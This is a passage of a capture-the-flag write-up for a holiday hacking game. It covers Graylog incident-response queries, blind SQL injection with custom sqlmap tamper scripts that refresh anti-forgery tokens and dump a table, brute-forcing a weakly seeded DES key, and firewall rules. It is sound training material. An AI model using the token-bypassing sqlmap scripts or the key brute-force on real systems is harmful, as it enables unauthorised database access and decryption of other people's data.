+Some Elf U computers were hacked, and I've been tasked with performing incident response.
+Can you help me fill out the incident response report using our instance of Graylog?</p>
+<p>It's probably helpful if you know a few things about Graylog.
+Event IDs and Sysmon are important too. Have you spent time with those?
+Don't worry - I'm sure you can figure this all out for me!
+Click on the All messages Link to access the Graylog search interface!
+Make sure you are searching in all messages!</p>
+<p>The Elf U Graylog server has an integrated incident response reporting system. Just mouse-over the box in the lower-right corner.
+Login with the username elfustudent and password elfustudent.</p>
+</div>
+<h3 id="investigate-an-incident-using-graylog">Investigate an incident using Graylog</h3>
+<p>Access the ElfU Graylog server as instructed above by Pepper Minstix.  After logging in, click on the "All Messages" link, then select "Search in all messages" in the drop-down box at the top of the next screen.  Find the first question by hovering over the box in the lower-right corner of the screen.</p>
+<p><strong>Question 1:</strong> Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file. What is the full-path + filename of the first malicious file downloaded by Minty? </p>
+<ul>
+<li>
+<p>Query: <code>EventID:2 AND ProcessImage:"C:\\Program Files\\Mozilla Firefox\\firefox.exe" AND NOT TargetFilename:C\:\\*.temp</code></p>
+</li>
+<li>
+<p>Answer: C:\Users\minty\Downloads\cookie_recipe.exe </p>
+</li>
+<li>
+<p>Solution: Find this by searching for sysmon file creation event id 2 with a process named firefox.exe and not junk .temp files.  Use wildcards or regular expressions to include or exclude patterns.  Note: by default, Graylog will not permit a wildcard at the beginning of a search string, so a regular expression is more useful in this case (example: <code>TargetFilename:/.+\.pdf/</code>).</p>
+</li>
+</ul>
+<p><strong>Question 2:</strong> The malicious file downloaded and executed by Minty gave the attacker remote access to his machine. What was the ip:port the malicious file connected to first?</p>
+<ul>
+<li>
+<p>Query: <code>EventID:3 AND ProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe.exe</code></p>
+</li>
+<li>
+<p>Answer: 192.168.247.175:4444 </p>
+</li>
+<li>
+<p>Pivot off the answer to the first question using the binary path as our ProcessImage.</p>
+</li>
+</ul>
+<p><strong> Question 3: </strong> What was the first command executed by the attacker? (answer is a single word)</p>
+<ul>
+<li>
+<p>Query: <code>EventID:1 AND ParentProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe.exe</code> (also, reverse the timestamp order of the results so the oldest log entry comes first)</p>
+</li>
+<li>
+<p>Answer: whoami </p>
+</li>
+<li>
+<p>Since all commands (sysmon event id 1) by the attacker are initially running through the cookie_recipe.exe binary, set its full-path as the ParentProcessImage to find child processes it creates sorting on timestamp.</p>
+</li>
+</ul>
+<p><strong>Question 4:</strong> What is the one-word service name the attacker used to escalate privileges?</p>
+<ul>
+<li>
+<p>Query: (same as above)</p>
+</li>
+<li>
+<p>Answer: webexservice </p>
+</li>
+<li>
+<p>Continuing on using the cookie_reciper.exe binary as the ParentProcessImage, look for subsequent commands related to a service.</p>
+</li>
+</ul>
+<p><strong> Question 5:</strong> What is the file-path + filename of the binary ran by the attacker to dump credentials?</p>
+<ul>
+<li>
+<p>Query: <code>EventID:1 AND ParentProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe2.exe</code></p>
+</li>
+<li>
+<p>Answer: C:\cookie.exe </p>
+</li>
+<li>
+<p>This executable is mimikatz.exe in disguise.  The attacker elevates privileges using the vulnerable webexservice to run a file called cookie_recipe2.exe. Use this binary path to search for a matching ParentProcessImage.</p>
+</li>
+</ul>
+<p><strong>Question 6:</strong> The attacker pivoted to another workstation using credentials gained from Minty's computer. Which account name was used to pivot to another machine?</p>
+<ul>
+<li>
+<p>Query: <code>EventID:4624 AND SourceNetworkAddress:192.168.247.175</code></p>
+</li>
+<li>
+<p>Answer: alabaster </p>
+</li>
+<li>
+<p>Windows Event Id 4624 is generated when a user network logon occurs successfully. You can also filter on the attacker's IP using SourceNetworkAddress.</p>
+</li>
+</ul>
+<p><strong>Question 7:</strong> What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to another machine?</p>
+<ul>
+<li>
+<p>Query: <code>EventID:4624 AND SourceNetworkAddress:192.168.247.175 AND LogonType:10</code></p>
+</li>
+<li>
+<p>Answer: 06:04:28 </p>
+</li>
+<li>
+<p>LogonType 10 is used for successful network connections using the RDP client.</p>
+</li>
+</ul>
+<p><strong>Question 8:</strong> The attacker navigates the file system of a third host using their Remote Desktop Connection to the second host. What is the SourceHostName,DestinationHostname,LogonType of this connection?</p>
+<ul>
+<li>
+<p>Query: <code>SourceHostName:ELFU\-RES\-WKS2 AND LogonType:3 AND EventID:4624</code></p>
+</li>
+<li>
+<p>Answer: elfu-res-wks2,elfu-res-wks3,3 </p>
+</li>
+<li>
+<p>The attacker has GUI access to workstation 2 via RDP. They likely used this GUI connection to access the file system of of workstation 3 using explorer.exe via UNC file paths (which is why you don't see any cmd.exe or powershell.exe process creation events). However, you will still see the successful network authentication for this with event id 4624 and logon type 3.</p>
+</li>
+</ul>
+<p><strong>Question 9:</strong> What is the full-path + filename of the secret research document after being transferred from the third host to the second host?</p>
+<ul>
+<li>
+<p>Query: <code>EventID:2 AND source:elfu\-res\-wks2 AND NOT TargetFilename:/.+AppData.+/</code></p>
+</li>
+<li>
+<p>Answer: C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf </p>
+</li>
+<li>
+<p>Look for a sysmon file creation event id of 2 with a source of workstation 2.  You can also use regex to filter out overly common file paths using something like: AND NOT TargetFilename:/.+AppData.+/</p>
+</li>
+</ul>
+<p><strong>Question 10:</strong> What is the IPv4 address (as found in logs) the secret research document was exfiltrated to?</p>
+<ul>
+<li>
+<p>Query: <code>CommandLine:/.+super_secret_elfu_research.pdf.+/</code></p>
+</li>
+<li>
+<p>Answer: 104.22.3.84</p>
+</li>
+<li>
+<p>Look for the original document in CommandLine using regex. You'll see a long a long PowerShell command using Invoke-Webrequest to a remote URL of https://pastebin.com/post.php. Pivot off of this information to look for a sysmon network connection id of 3 with a source of elfu-res-wks2 and DestinationHostname of pastebin.com.</p>
+</li>
+</ul>
+<p>Once the questions are answered, you get:</p>
+<div class="codehilite"><pre><span></span>Incident Response Report #7830984301576234 Submitted.
+Incident Fully Detected!
+</pre></div>
+
+
+<h3 id="hint-from-pepper-minstix">Hint from Pepper Minstix</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/elf4.png">
+That's it - hooray!</p>
+<p>Have you had any luck retrieving scraps of paper from the Elf U server?</p>
+<p>You might want to look into SQL injection techniques.</p>
+<p>OWASP is always a good resource for web attacks.</p>
+<p>For blind SQLi, I've heard Sqlmap is a great tool.</p>
+<p>In certain circumstances though, you need custom tamper scripts to get things going!</p>
+</div>
+<h3 id="obtain-the-scraps-of-paper">Obtain the scraps of paper</h3>
+<p>If you run sqlmap with with only default settings, it will detect that there are injectable input parameters; however it is unable to exploit them.  Upon inspecting the request to the server closer, you observe that there is a token submitted along with data from the input fields on the form.</p>
+<p><img alt="" src="img/studentportal-token.png" /></p>
+<p>This token is obtained by the browser using some javascript code immediately before the form is submitted to the server.  Without the token, the submission is considered invalid.</p>
+<div class="codehilite"><pre><span></span><span class="c">&lt;!--</span>  <span class="nx">Custom</span> <span class="nx">js</span> <span class="o">--&gt;</span>
+<span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+
+<span class="kd">function</span> <span class="nx">submitApplication</span><span class="p">()</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Submitting&quot;</span><span class="p">);</span>
+  <span class="nx">elfSign</span><span class="p">();</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;check&quot;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="kd">function</span> <span class="nx">elfSign</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;token&quot;</span><span class="p">);</span>
+
+  <span class="kr">const</span> <span class="nx">Http</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+  <span class="kr">const</span> <span class="nx">url</span><span class="o">=</span><span class="s1">&#39;/validator.php&#39;</span><span class="p">;</span>
+  <span class="nx">Http</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+  <span class="nx">Http</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="nx">Http</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">Http</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
+    <span class="nx">s</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">Http</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
+  <span class="p">}</span>
+
+<span class="p">}</span>
+</pre></div>
+
+
+<p>To solve this challenge, you'll have to figure out how to make sqlmap obtain a token each time it submits a request to the server.  Fortunately, it's pretty easy to obtain a token.</p>
+<div class="codehilite"><pre><span></span>$ curl https://studentportal.elfu.org/validator.php
+MTAxMDQ4MTUwNjU2MTU3ODg3NzM1NDEwMTA0ODE1MC42NTY=_MTI5MzQxNjMyODM5NjgzMjMzNTQwODIwLjk5Mg==
+</pre></div>
+
+
+<p>Pepper Minstix suggested using a tamper script to automate this.  Sqlmap includes some tamper scripts out of the box for some common IDS and WAF evasion techniques, but you can write a custom tamper script to manipulate the payload your own way.</p>
+<p>This tamper script (elfu.py) should work, using the following command: <code>sqlmap -u "https://studentportal.elfu.org/application-received.php" --data "name=a&amp;elfmail=elf@u.edu&amp;program=c&amp;phone=d&amp;whyme=e&amp;essay=f" -p essay --tamper elfu</code></p>
+<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">lib.core.data</span> <span class="kn">import</span> <span class="n">kb</span>
+<span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">NORMAL</span>
+
+<span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
+    <span class="k">pass</span>
+
+<span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;https://studentportal.elfu.org/validator.php&quot;</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+        <span class="n">token</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;</span><span class="si">%s</span><span class="s2">&amp;token=</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">token</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">payload</span>
+</pre></div>
+
+
+<p>It turns out this doesn't work because sqlmap urlencoded the <code>&amp;token=&lt;string&gt;</code> in the POST data, making it invalid to the server.</p>
+<p>To get around that, you modify the tamper script to supply all of the parameters, which you selectively urlencode.  This time, you run <code>sqlmap -u "https://studentportal.elfu.org/application-received.php" --data "*" --tamper elfu --skip-urlencode</code> with the following tamper script.</p>
+<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">lib.core.data</span> <span class="kn">import</span> <span class="n">kb</span>
+<span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+
+<span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">NORMAL</span>
+
+<span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
+    <span class="k">pass</span>
+
+<span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
+        <span class="n">params1</span> <span class="o">=</span> <span class="s1">&#39;name=a&amp;elfmail=elf</span><span class="si">%40u</span><span class="s1">.edu&amp;program=c&amp;phone=d&amp;whyme=e&#39;</span>
+        <span class="n">params2</span> <span class="o">=</span> <span class="s1">&#39;&amp;essay=f</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">urllib</span><span class="o">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://studentportal.elfu.org/validator.php&#39;</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+        <span class="n">token</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="si">%s%s</span><span class="s1">&amp;token=</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">params1</span><span class="p">,</span> <span class="n">params2</span><span class="p">,</span> <span class="n">token</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">payload</span>
+</pre></div>
+
+
+<p>To prevent sqlmap from urlencoding the payload that time, you included <code>--skip-urlencode</code> in the command line options.  In doing so, however, sqlmap changed the Content-Type: header to <code>text/plain</code> instead of <code>application/x-www-form-urlencoded</code>.  </p>
+<p>To compensate, you edit sqlmap's <code>lib/core/settings.py</code> file and force it to use <code>application/x-www-form-urlencoded</code> when using <code>--skip-urlencode</code>.</p>
+<div class="codehilite"><pre><span></span># Raw text POST data content-type
+#PLAIN_TEXT_CONTENT_TYPE = &quot;text/plain; charset=utf-8&quot;  &lt;-- comment this line and replace with:
+PLAIN_TEXT_CONTENT_TYPE = &quot;application/x-www-form-urlencoded; charset=utf-8&quot;
+</pre></div>
+
+
+<p>Run the previous command again, and now you get some results.</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>There is an easier way to do this with sqlmap's --eval option, which doesn't require modifying sqlmap's code</p>
+<p><code>$ sqlmap https://studentportal.elfu.org/application-received.php -p essay --data='name=a&amp;elfmail=elf%40u.edu&amp;program=c&amp;phone=d&amp;whyme=e&amp;essay=f&amp;token=TOKENSTRING' --eval="import requests; resp=requests.get('https://studentportal.elfu.org/validator.php'); token=resp.text.encode('utf-8')"</code></p>
+</div>
+<p>Once you manage to get a successful SQL injection, explore the tables in the database, and you will find a listing of images.</p>
+<div class="codehilite"><pre><span></span>$ sqlmap -u &quot;https://studentportal.elfu.org/application-received.php&quot; --data &quot;*&quot; \
+   --tamper tamper/elfu2.py --skip-urlencode --dump -T krampus
+
+&lt;..output shortened..&gt;
+
+Database: elfu
+Table: krampus
+[6 entries]
++----+-----------------------+
+| id | path                  |
++----+-----------------------+
+| 1  | /krampus/0f5f510e.png |
+| 2  | /krampus/1cc7e121.png |
+| 3  | /krampus/439f15e6.png |
+| 4  | /krampus/667d6896.png |
+| 5  | /krampus/adb798ca.png |
+| 6  | /krampus/ba417715.png |
++----+-----------------------+
+</pre></div>
+
+
+<p>Download the images from the server and arranging them using your preferred image editing software (i.e. GIMP).  This reveals the following letter.</p>
+<p><img alt="Letter" src="img/scraps-reassembled.png" /></p>
+<p>Is that a tooth in the background?</p>
+<p><strong>Answer: Super Sled-o-matic</strong></p>
+<h2 id="objective-10-recover-cleartext-document">Objective 10 - Recover Cleartext Document</h2>
+<p><em>The <a href="https://downloads.elfu.org/elfscrow.exe">Elfscrow Crypto</a> tool is a vital asset used at Elf University for encrypting SUPER SECRET documents. We can't send you the source, but we do have <a href="https://downloads.elfu.org/elfscrow.pdb">debug symbols</a> that you can use.
+Recover the plaintext content for this <a href="https://downloads.elfu.org/ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc">encrypted document</a>. We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC.
+What is the middle line on the cover page? (Hint: it's five words)
+For hints on achieving this objective, please visit the NetWars room and talk with Holly Evergreen.</em></p>
+<h3 id="talk-to-holly-evergreen">Talk to Holly Evergreen</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/elf2.png">
+Hey! It's me, Holly Evergreen! My teacher has been locked out of the quiz database and can't remember the right solution.</p>
+<p>Without access to the answer, none of our quizzes will get graded.</p>
+<p>Can we help get back in to find that solution?</p>
+<p>I tried lsof -i, but that tool doesn't seem to be installed.</p>
+<p>I think there's a tool like ps that'll help too. What are the flags I need?</p>
+<p>Either way, you'll need to know a teensy bit of Mongo once you're in.</p>
+<p>Pretty please find us the solution to the quiz!</p>
+</div>
+<h3 id="terminal-mongo">Terminal: Mongo</h3>
+<p><img alt="Mongo" src="img/terminal-mongo.png" /></p>
+<p>Run the ps command with the -w flag to view the full command line options used to start mongo, which shows the listening port is changed from default to 12121.</p>
+<div class="codehilite"><pre><span></span>elf@caf55ec1bebd:~$ ps -efw
+UID        PID  PPID  C STIME TTY          TIME CMD
+elf          1     0  0 05:47 pts/0    00:00:00 /bin/bash
+mongo        9     1 12 05:47 ?        00:00:01 /usr/bin/mongod --quiet --fork --port 12121 --bind_ip 127.0.0.1 --logpath=/tmp/mongo.log
+</pre></div>
+
+
+<p>Connect to mongo, switch to the elfu database and find the collection called solution.</p>
+<div class="codehilite"><pre><span></span>elf@caf55ec1bebd:~$ mongo 127.0.0.1:12121 
+MongoDB shell version v3.6.3
+connecting to: mongodb://127.0.0.1:12121/test
+MongoDB server version: 3.6.3
+Welcome to the MongoDB shell.
+
+&gt; show dbs
+admin  0.000GB
+elfu   0.000GB
+local  0.000GB
+test   0.000GB
+
+&gt; use elfu
+switched to db elfu
+
+&gt; show collections
+bait
+chum
+line
+metadata
+solution
+system.js
+tackle
+tincan
+</pre></div>
+
+
+<p>Look at the contents of the solution collection, and then follow the instructions you find there to solve the terminal.</p>
+<div class="codehilite"><pre><span></span>&gt; db.solution.find()
+{ &quot;_id&quot; : &quot;You did good! Just run the command between the stars: ** db.loadServerScripts();displaySolution(); **&quot; }
+
+&gt; db.loadServerScripts();displaySolution();
+        .
+       __/ __
+            /
+       /.&#39;o&#39;. 
+        .o.&#39;.
+       .&#39;.&#39;*&#39;.
+      o&#39;.*.&#39;.o.
+     .&#39;.o.&#39;.&#39;.*.
+    .*.&#39;.*.&#39;.*.&#39;.
+       [_____]
+        ___/
+
+
+  Congratulations!!
+</pre></div>
+
+
+<h3 id="get-hint-from-holly-evergreen">Get hint from Holly Evergreen</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/elf2.png">
+Woohoo! Fantabulous! I'll be the coolest elf in class.</p>
+<p>On a completely unrelated note, digital rights management can bring a hacking elf down.</p>
+<p>That ElfScrow one can really be a hassle.</p>
+<p>It's a good thing Ron Bowes is giving a talk on reverse engineering!</p>
+<p>That guy knows how to rip a thing apart. It's like he breathes opcodes!</p>
+</div>
+<h3 id="recover-the-clear-text-document">Recover the clear-text document</h3>
+<p>An outline for carrying out this task is provided in the KringleCon talk by Ron Bowes, <a href="https://www.youtube.com/watch?v=obJdpKDpFBA">Reversing Crypto the Easy Way</a>.  After watching the talk, download the demonstration code used in the talk.  Then you'll need to collect some information.</p>
+<ol>
+<li>
+<p>The key length: <strong>8</strong>.  This is easy to obtain, as the elfscrow program tells you this when you run it.</p>
+</li>
+<li>
+<p>The crypto algorithm and mode: <strong>DES-CBC</strong>.  This is determined by examining the block length of the resulting encrypted data, and whether repeating plain text results in repeating patterns of cipher text.</p>
+</li>
+<li>
+<p>The crypto library used to build the program: <strong>Microsoft Crypto Library</strong>.  Determine this by opening elfscrow.exe in IDA along with the provided debug symbols.</p>
+</li>
+<li>
+<p>The possible seed values: <strong>1575658800-1575666000</strong>.  Simply convert the dates provided in the objective to epoch integer values at <a href="http://epochconverter.com">epochconverter.com</a>.</p>
+</li>
+<li>
+<p>The random key generation algorithm associated with Microsoft Crypto Library.  Go to the <a href="https://rosettacode.org/wiki/Linear_congruential_generator#Ruby">rosettacode.org website</a> and copy the Ruby key generation code for Microsoft.</p>
+</li>
+</ol>
+<p>With all of the necessary information gathered, modify the demonstration code and run it.  The decryption function will report success on any valid key, even if it's not the right one.  Your code should therefore check to see if the plaintext contains PDF data before writing out the data to a file.</p>
+<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/ruby</span>
+
+<span class="nb">require</span> <span class="s1">&#39;openssl&#39;</span>
+
+<span class="no">KEY_LENGTH</span> <span class="o">=</span> <span class="mi">8</span> <span class="c1"># TODO: What is the length of the key?</span>
+
+<span class="k">def</span> <span class="nf">generate_key</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
+  <span class="n">key</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+  <span class="mi">1</span><span class="o">.</span><span class="n">upto</span><span class="p">(</span><span class="no">KEY_LENGTH</span><span class="p">)</span> <span class="k">do</span>
+    <span class="n">key</span> <span class="o">+=</span> <span class="p">((</span><span class="n">seed</span> <span class="o">=</span> <span class="p">((</span><span class="mi">214013</span> <span class="o">*</span> <span class="n">seed</span> <span class="o">+</span> <span class="mi">2531011</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7fff_ffff</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="o">&amp;</span> <span class="mh">0x0FF</span><span class="p">)</span><span class="o">.</span><span class="n">chr</span>
+  <span class="k">end</span>
+  <span class="k">return</span> <span class="n">key</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+     <span class="n">c</span> <span class="o">=</span> <span class="no">OpenSSL</span><span class="o">::</span><span class="no">Cipher</span><span class="o">::</span><span class="no">DES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;cbc&#39;</span><span class="p">)</span> <span class="c1"># TODO: What&#39;s the ALG + details?</span>
+     <span class="n">c</span><span class="o">.</span><span class="n">decrypt</span>
+     <span class="n">c</span><span class="o">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">key</span>
+     <span class="k">return</span> <span class="p">(</span><span class="n">c</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="n">c</span><span class="o">.</span><span class="n">final</span><span class="p">())</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">writefile</span><span class="p">(</span><span class="n">plain</span><span class="p">)</span>
+  <span class="n">file</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf&quot;</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span> <span class="k">do</span><span class="o">|</span><span class="n">f</span><span class="o">|</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">plain</span><span class="p">)</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="c1">#Begin</span>
+
+<span class="n">file</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span>
+<span class="n">file</span><span class="o">.</span><span class="n">close</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="mi">1575658800</span><span class="o">..</span><span class="mi">1575666000</span> <span class="k">do</span>
+  <span class="n">seed</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">to_i</span>
+  <span class="n">key</span> <span class="o">=</span> <span class="n">generate_key</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
+  <span class="c1">#puts(&quot;Generated key: #{key.unpack(&#39;H*&#39;)} &quot; + seed.to_s)</span>
+  <span class="k">begin</span>
+    <span class="n">plain</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+  <span class="k">rescue</span>
+    <span class="c1">#do nothing</span>
+  <span class="k">else</span>
+    <span class="k">if</span> <span class="n">plain</span><span class="o">[</span><span class="mi">0</span><span class="o">..</span><span class="mi">5</span><span class="o">].</span><span class="n">include?</span> <span class="s2">&quot;%PDF&quot;</span>
+       <span class="n">writefile</span><span class="p">(</span><span class="n">plain</span><span class="p">)</span>
+       <span class="nb">puts</span><span class="p">(</span><span class="s2">&quot;Decrypted file using key </span><span class="si">#{</span><span class="n">key</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;H*&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2"> (seed value is </span><span class="si">#{</span><span class="n">seed</span><span class="o">.</span><span class="n">to_s</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">)</span>
+       <span class="k">break</span>
+    <span class="k">end</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+</pre></div>
+
+
+<p>Running this produces the decrypted file <a href="files/ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf">ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf</a>.</p>
+<p><strong>Answer: Machine Learning Sleigh Route Finder</strong></p>
+<h2 id="objective-11-open-the-sleigh-shop-door">Objective 11 - Open the Sleigh Shop Door</h2>
+<p><em>Visit Shinny Upatree in the Student Union and help solve their problem. What is written on the paper you retrieve for Shinny?
+For hints on achieving this objective, please visit the Student Union and talk with Kent Tinseltooth.  (Difficulty: 5 out of 5)</em></p>
+<h3 id="talk-to-kent-tinseltooth">Talk to Kent Tinseltooth</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/kent.png">
+OK, this is starting to freak me out!</p>
+<p>Oh sorry, I'm Kent Tinseltooth. My Smart Braces are acting up.</p>
+<p>Do... Do you ever get the feeling you can hear things? Like, voices?</p>
+<p>I know, I sound crazy, but ever since I got these... Oh!</p>
+<p>Do you think you could take a look at my Smart Braces terminal?</p>
+<p>I'll bet you can keep other students out of my head, so to speak.</p>
+<p>It might just take a bit of Iptables work.</p>
+</div>
+<h3 id="terminal-smart-braces-server">Terminal: Smart Braces Server</h3>
+<p><img alt="Screenshot of Braces Terminal" src="img/terminal-braces.png" /></p>
+<p>Kent needs you to configure the firewall on the Smart Braces server.  Read the file referenced in the opening screen, which describes the characteristics of a proper configuration.</p>
+<blockquote>
+<p>A proper configuration for the Smart Braces should be exactly:</p>
+<ol>
+<li>Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains.</li>
+<li>Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains.</li>
+<li>Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22).</li>
+<li>Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80.</li>
+<li>Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80.</li>
+<li>Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface.</li>
+</ol>
+</blockquote>
+<p>Use the following commands to configure IP tables:</p>
+<div class="codehilite"><pre><span></span>sudo iptables -P INPUT DROP
+sudo iptables -P OUTPUT DROP
+sudo iptables -P FORWARD DROP
+sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
+sudo iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
+sudo iptables -A INPUT -p tcp -m conntrack --ctstate NEW --dport 22 -s 172.19.0.225 -j ACCEPT
+sudo iptables -A INPUT -p tcp -m conntrack --ctstate NEW -m multiport --dports 21,80 -j ACCEPT
+sudo iptables -A OUTPUT -p tcp -m conntrack --ctstate NEW --dport 80 -d 0.0.0.0/0 -j ACCEPT
+sudo iptables -A INPUT -i lo -j ACCEPT
+</pre></div>
+
+
+<p>Moments later, a message appears on the terminal:</p>
+<p><code>Kent TinselTooth: Great, you hardened my IOT Smart Braces firewall!</code></p>
+<h3 id="hint-from-kent-tinseltooth">Hint from Kent Tinseltooth</h3>
+<div class="admonition quote">
+<p><img align="left" src="img/kent.png">
+Oh thank you! It's so nice to be back in my own head again. Er, alone.  </p>
+<p>By the way, have you tried to get into the crate in the Student Union? It has an interesting set of locks.
+There are funny rhymes, references to perspective, and odd mentions of eggs!
+And if you think the stuff in your browser looks strange, you should see the page source...  </p>
+<p>Special tools? No, I don't think you'll need any extra tooling for those locks.
